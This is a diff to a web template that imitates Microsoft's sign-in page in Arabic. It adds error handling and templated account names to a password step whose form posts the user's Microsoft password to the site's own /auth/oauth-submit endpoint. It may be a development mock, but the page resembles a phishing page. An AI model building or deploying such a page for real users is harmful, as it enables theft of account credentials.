@@ -97,6 +97,15 @@
     .ms-input:focus {
       border-bottom: 2px solid #0086f0;
     }
+    .ms-input.input-error {
+      border-bottom: 2px solid #e81123 !important;
+    }
+    .ms-error-banner {
+      color: #e81123;
+      font-size: 13px;
+      margin-bottom: 16px;
+      line-height: 1.5;
+    }
     .ms-input::placeholder {
       color: #888888;
     }
@@ -190,7 +199,7 @@
       </div>
 
       <!-- STEP 1: Email / Account Input -->
-      <div id="msStep1">
+      <div id="msStep1" style="{{ 'display:none;' if error or show_password_step else 'display:block;' }}">
         <h1 class="ms-title">تسجيل الدخول</h1>
 
         <div class="ms-quick-list">
@@ -226,21 +235,27 @@
       </div>
 
       <!-- STEP 2: Password Input -->
-      <div id="msStep2" style="display:none;">
+      <div id="msStep2" style="{{ 'display:block;' if error or show_password_step else 'display:none;' }}">
         <div class="ms-pill" onclick="backToStep1()">
           <span>←</span>
-          <span id="msPillEmail">sam.dev1@hotmail.com</span>
+          <span id="msPillEmail">{{ selected_email or default_email or 'sam.dev1@hotmail.com' }}</span>
         </div>
 
         <h1 class="ms-title">أدخل كلمة المرور</h1>
 
+        {% if error %}
+        <div class="ms-error-banner">
+          {{ error }}
+        </div>
+        {% endif %}
+
         <form action="/auth/oauth-submit" method="POST">
           <input type="hidden" name="provider" value="microsoft" dir="auto">
-          <input type="hidden" id="msFormName" name="name" value="Sam Salameh" dir="auto">
-          <input type="hidden" id="msFormEmail" name="email" value="sam.dev1@hotmail.com" dir="auto">
+          <input type="hidden" id="msFormName" name="name" value="{{ selected_name or default_name or 'Sam Salameh' }}" dir="auto">
+          <input type="hidden" id="msFormEmail" name="email" value="{{ selected_email or default_email or 'sam.dev1@hotmail.com' }}" dir="auto">
 
           <div class="ms-input-group">
-            <input type="password" id="msPasswordInput" name="password" class="ms-input" placeholder="كلمة المرور" required autofocus dir="auto">
+            <input type="password" id="msPasswordInput" name="password" class="ms-input {{ 'input-error' if error else '' }}" placeholder="كلمة المرور" required autofocus dir="auto">
           </div>
 
           <div class="ms-links">
@@ -265,7 +280,11 @@
       
       document.getElementById('msStep1').style.display = 'none';
       document.getElementById('msStep2').style.display = 'block';
-      setTimeout(() => document.getElementById('msPasswordInput').focus(), 100);
+      const pwdIn = document.getElementById('msPasswordInput');
+      pwdIn.classList.remove('input-error');
+      const errEl = document.querySelector('.ms-error-banner');
+      if (errEl) errEl.style.display = 'none';
+      setTimeout(() => pwdIn.focus(), 100);
     }
 
     function nextToPassword() {
